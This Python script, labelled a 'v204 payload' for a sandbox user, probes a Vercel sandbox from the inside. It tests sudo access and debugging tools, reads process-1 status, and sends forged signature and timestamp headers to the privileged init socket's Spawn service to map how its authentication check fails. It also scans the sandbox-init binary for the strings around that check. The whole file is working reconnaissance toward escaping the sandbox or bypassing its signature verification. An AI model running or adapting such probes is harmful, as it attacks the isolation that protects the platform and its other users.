# -*- coding: utf-8 -*-
"""v204 payload (sandbox user): Spawn 签名矩阵 + sudo 检查 + 二进制上下文
1. sudo -n id / whoami / apt 检查
2. Spawn 签名矩阵 (connect+json 错误消息差异)
3. 二进制 missing timestamp 附近完整上下文"""
import socket, time, json, os, sys, re, signal, subprocess

signal.alarm(200)

def log(s, maxlen=3500):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

SOCK = '/run/vercel/share/init.sock'

def punix(sp, path, body, t=8, extra=None, ctype='application/connect+json'):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n' % (path, ctype)
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n' % len(b)
        if extra:
            for k, v in extra.items():
                hdrs += '%s: %s\r\n' % (k, v)
        hdrs += '\r\n'
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        return d[:4000]
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()

# ============ 1: sudo / env ============
log('=== 1 sudo ===')
for cmdline in [
    ['id'],
    ['sudo', '-n', 'id'],
    ['sudo', '-n', 'whoami'],
    ['which', 'strace'],
    ['which', 'apt-get'],
    ['which', 'gdb'],
    ['cat', '/proc/1/status'],
]:
    try:
        r = subprocess.run(cmdline, capture_output=True, timeout=8)
        log('RUN %s -> rc=%d out=%r err=%r' % (' '.join(cmdline), r.returncode, r.stdout[:300], r.stderr[:200]))
    except Exception as e:
        log('RUN %s EXC %s' % (' '.join(cmdline), e))

# ============ 2: Spawn 签名矩阵 ============
log('=== 2 spawn sig matrix ===')
path = '/vercel.sandbox.spawn.v1.SpawnService/Spawn'
now = str(int(time.time()))
cases = [
    ('no-hdr', None),
    ('ts-only', {'X-Timestamp': now}),
    ('sig-only', {'X-Signature': 'AAAA'}),
    ('both-fake', {'X-Signature': 'AAAA', 'X-Timestamp': now}),
    ('both-b64', {'X-Signature': 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==', 'X-Timestamp': now}),
    ('old-ts', {'X-Signature': 'AAAA', 'X-Timestamp': str(int(time.time()) - 3600)}),
    ('fut-ts', {'X-Signature': 'AAAA', 'X-Timestamp': str(int(time.time()) + 3600)}),
    ('ts-str', {'X-Signature': 'AAAA', 'X-Timestamp': 'abc'}),
    ('ts-float', {'X-Signature': 'AAAA', 'X-Timestamp': '123.45'}),
    ('ts-ms', {'X-Signature': 'AAAA', 'X-Timestamp': str(int(time.time() * 1000))}),
]
for name, extra in cases:
    pay = punix(SOCK, path, {'name': 'x'}, t=6, extra=extra)
    log('CASE %s -> %r' % (name, pay[:500]))

# ============ 3: 二进制上下文 (missing timestamp 周围) ============
log('=== 3 bin ctx 5196361 ===')
try:
    d = open('/run/vercel/share/sandbox-init', 'rb').read()
    for kw in [b'missing timestamp', b'missing signature', b'invalid sign', b'signature mismatch', b'expired', b'token', b'signature', b'crypto/ed25519']:
        idxs = [m.start() for m in re.finditer(kw, d)]
        log('KW %s hits=%d' % (kw.decode(), len(idxs)))
        for i in idxs[:6]:
            seg = d[max(0, i - 100):i + 400]
            try:
                txt = seg.decode('utf-8', errors='replace')
            except Exception:
                txt = repr(seg)
            log('  @%d: %r' % (i, txt[:420]))
except Exception as e:
    log('BIN EXC %s' % e)

log('V204_DONE')
